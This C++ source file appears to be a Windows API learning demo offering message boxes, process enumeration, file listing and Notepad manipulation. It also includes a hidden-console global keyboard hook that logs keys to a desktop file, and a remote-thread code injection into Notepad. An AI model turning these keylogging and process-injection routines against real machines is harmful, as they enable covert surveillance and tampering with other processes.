#include "WinApi.h"
#include <Windows.h>
#include <iostream>
#include <tchar.h> 
#include <strsafe.h>
#include <psapi.h>
#include <string>
#include <tlhelp32.h>
HHOOK WinApi::_hook;
KBDLLHOOKSTRUCT WinApi::kbdStruct;

// internal APC functions

void WinApi::Papcfunc1() {
    MessageBoxW(0, L"1", L"1", 0);
}

void WinApi::Papcfunc2() {
    MessageBoxW(0, L"2", L"2", 0);
}

void WinApi::Papcfunc3() {
    MessageBoxW(0, L"3", L"3", 0);
}

// function to show APC work in user space
void WinApi::_APCFunction() {
    HANDLE thr = GetCurrentThread();

    QueueUserAPC((PAPCFUNC)Papcfunc1, thr, 1);
    QueueUserAPC((PAPCFUNC)Papcfunc2, thr, 1);
    QueueUserAPC((PAPCFUNC)Papcfunc3, thr, 1);

    SleepEx(1, 1);
}

// function helper for _Keylogger
int WinApi::__textWriteToFile(std::string letter) {
    HANDLE hFile = CreateFile(
        L"C:\\Users\\user\\Desktop\\log.txt",    // Filename
        FILE_APPEND_DATA,          // Desired access
        FILE_SHARE_READ,        // Share mode
        NULL,                   // Security attributes
        OPEN_ALWAYS,             // Creates a new file, only if it doesn't already exist
        FILE_ATTRIBUTE_NORMAL,  // Flags and attributes
        NULL);                  // Template file handle

    if (hFile == INVALID_HANDLE_VALUE) {
        return 2;
    }

    DWORD bytesWritten;
    WriteFile(
        hFile,            // Handle to the file
        letter.c_str(),  // Buffer to write
        letter.size(),   // Buffer size
        &bytesWritten,    // Bytes written
        nullptr);         // Overlapped

    CloseHandle(hFile);
}

// function helper for _Keylogger
LRESULT __stdcall WinApi::__HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        if (wParam == WM_KEYDOWN) {
            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
            if (kbdStruct.vkCode == VK_F1) {
                MessageBoxA(NULL, "F1 is pressed!", "key pressed", MB_ICONINFORMATION);
            }
            if (kbdStruct.vkCode == 0x41) {
                //MessageBoxA(NULL, "A is pressed!", "key pressed", MB_ICONINFORMATION);
                __textWriteToFile("A");
            }
            if (kbdStruct.vkCode == 0x42) {
                __textWriteToFile("B");
            }
            if (kbdStruct.vkCode == 0x43) {
                __textWriteToFile("C");
            }
        }
    }

    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

// function helper for _Keylogger
void WinApi::__ReleaseHook() {
    UnhookWindowsHookEx(_hook);
}

// function helper for _Keylogger
void WinApi::__SetHook() {
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, __HookCallback, NULL, 0))) {
        MessageBoxA(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
    }
}

void WinApi::_Keylogger() {
    __SetHook();

    MSG msg;
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    while (GetMessage(&msg, NULL, 0, 0)) {

    }
}

// function helper for _RunMessageBoxInAnotherProcessThread
void WINAPI WinApi::__MsgBoxWrap(MsgParam* p) {
    p->pFunc(p->hWnd, p->lpTextb, p->lpCaption, p->uType);
}

// function helper for _RunMessageBoxInAnotherProcessThread
void WinApi::__after_MsgBoxWrap() {}

void WinApi::_RunMessageBoxInAnotherProcessThread() {
    // Realization was taken for here: https://www.c-plusplus.net/forum/topic/301481/virtualallocex-amp-createremotethread-gt-messagebox/15
    // works only in Release mode!
    typedef int (WINAPI* fMsgBox) (HWND, LPCWSTR, LPCWSTR, UINT);
    typedef struct {
        fMsgBox pFunc;
        HWND hWnd;
        LPCWSTR lpTextb;
        LPCWSTR lpCaption;
        UINT uType;
    } MsgParam;

    HANDLE hProcess;    // process 
    HANDLE hThread;        // remote thread 
    LPVOID pParam;        // pointer to allocated param space 
    LPVOID pFunc;        // pointer to allocated function space 
    DWORD sizeOfFunc;    // size of function to copy 
    DWORD procID;        // process ID 
    DWORD exitCode;        // CreateRemoteThread Exit Code 
    MsgParam param;        // MessageBox parameter inkl func. pointer 
    HWND hWnd;

    hWnd = FindWindow(0, L"Untitled - Notepad");

    param.pFunc = (fMsgBox)GetProcAddress(GetModuleHandle(L"User32"), "MessageBoxW");
    param.hWnd = NULL;
    param.lpTextb = 0;
    param.lpCaption = 0;
    param.uType = MB_YESNO;

    GetWindowThreadProcessId(hWnd, &procID);
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, procID);
    if (!hProcess) {
        printf("OpenProcess failed! Error: %d\n", GetLastError());
    }

    sizeOfFunc = (PBYTE)__after_MsgBoxWrap - (PBYTE)__MsgBoxWrap;
    //sizeOfFunc = 128;
    pParam = VirtualAllocEx(hProcess, NULL, sizeof(MsgParam), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pParam == NULL)
        printf("VirtualAllocEx failed! Error: %d\n", GetLastError());

    pFunc = VirtualAllocEx(hProcess, 0, sizeOfFunc, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pFunc == NULL)
        printf("VirtualAllocEx failed! Error: %d\n", GetLastError());

    WriteProcessMemory(hProcess, pParam, (LPVOID)&param, sizeof(MsgParam), NULL);
    WriteProcessMemory(hProcess, pFunc, (LPVOID)__MsgBoxWrap, sizeOfFunc, 0);

    hThread = CreateRemoteThread(hProcess, NULL, (SIZE_T)0, (LPTHREAD_START_ROUTINE)pFunc, (void*)pParam, (DWORD)0, NULL);
    if (!hThread)
        printf("CreateRemoteThread failed! Error: %d\n", GetLastError());

    WaitForSingleObject(hThread, INFINITE);
    GetExitCodeThread(hThread, &exitCode);
    CloseHandle(hProcess);
    //system("pause");
}

// function helper for EnumSystemProcesses()
void WinApi::__PrintProcessNameAndID(DWORD processID) {
    TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);

    if (NULL != hProcess) {
        HMODULE hMod;
        DWORD cbNeeded;

        if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
            GetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName) / sizeof(TCHAR));
        }
    }
    _tprintf(TEXT("%s  (PID: %u)\n"), szProcessName, processID);
    CloseHandle(hProcess);
}
void WinApi::_EnumSystemProcesses() {
    DWORD aProcesses[1024], cbNeeded, cProcesses;
    unsigned int i;

    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) {
        std::cout << "Error in enumerating processes!\n";
        exit(-1);
    }

    cProcesses = cbNeeded / sizeof(DWORD);
    for (i = 0; i < cProcesses; i++) {
        if (aProcesses[i] != 0) {
            __PrintProcessNameAndID(aProcesses[i]);
        }
    }
}
void WinApi::_DynamicDLLImport() {
    typedef int(WINAPI* MessageBeepProc)(UINT);

    HMODULE hModule1 = LoadLibrary(TEXT("USER32.dll"));
    MessageBeepProc MessageBeepF = (MessageBeepProc)GetProcAddress(hModule1, "MessageBeep");
    MessageBeepF(0xFFFFFFFF);
}
void WinApi::_NotepadChangeTitleExample() {
    HWND hWndCalc, hEditWnd;
    hWndCalc = FindWindowA("Notepad", NULL);
    if (hWndCalc) {
        // Set title of notepad to TEST
        SetWindowTextA(hWndCalc, "TEST");
        hEditWnd = FindWindowEx(hWndCalc, NULL, TEXT("Edit"), NULL);
        if (hEditWnd) {
            SendMessageA(hEditWnd, WM_SETTEXT, 0, (LPARAM)"TEST");
        }
    }
}
void WinApi::_ListFiles(std::string entered_path) {
    std::cout << entered_path.at(entered_path.length() - 1);
    if ((entered_path.at(entered_path.length() - 2) != '\\') || (entered_path.at(entered_path.length() - 1) != '*')) {
        system("cls");
        std::cout << "Wrong path format!\nExample: C:\\Users\\User\\Desktop\\*";
        exit(0);
    }
    std::wstring stemp = std::wstring(entered_path.begin(), entered_path.end());
    LPCWSTR szDir = stemp.c_str();

    HANDLE hFind = INVALID_HANDLE_VALUE;
    WIN32_FIND_DATA ffd;
    LARGE_INTEGER filesize;

    hFind = FindFirstFile(szDir, &ffd);

    do {
        // check if it's a directory
        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            //wcslen(ffd.cFileName
            _tprintf(TEXT("  %*s      <DIR>\n"), 30, ffd.cFileName);
        }
        else {
            // else it's a file
            filesize.LowPart = ffd.nFileSizeLow;
            filesize.HighPart = ffd.nFileSizeHigh;
            _tprintf(TEXT("  %*s      %ld bytes\n"), 30, ffd.cFileName, filesize.QuadPart);
        }
    } while (FindNextFile(hFind, &ffd) != 0);
    getchar();
}
void WinApi::_InfoAboutSystem() {
	ShellAbout(NULL, TEXT("hello"), TEXT("world"), NULL);
}
void WinApi::__Help() {
	system("cls");
    std::cout << "Enter one of these:\n \
		-H   : help\n \
		-S   : call MessageBoxW\n \
		-I   : Info about system\n \
		-L   : List files\n \
			    	also provide path: -L C:\\\\Files\\ \n \
		-N   : Change title and text of notepad process \n \
		-E   : Ennumerate processes \n \
		-R   : Run MessageBoxW in thread of another process\n \
		-K   : Run keylogger\n \
		-APC : Run APC functions\n";
	exit(0);
}
void WinApi::_ShowWindow() {
	MessageBoxW(NULL, TEXT("Text inside the window"), TEXT("Title of the window"), MB_OK);
}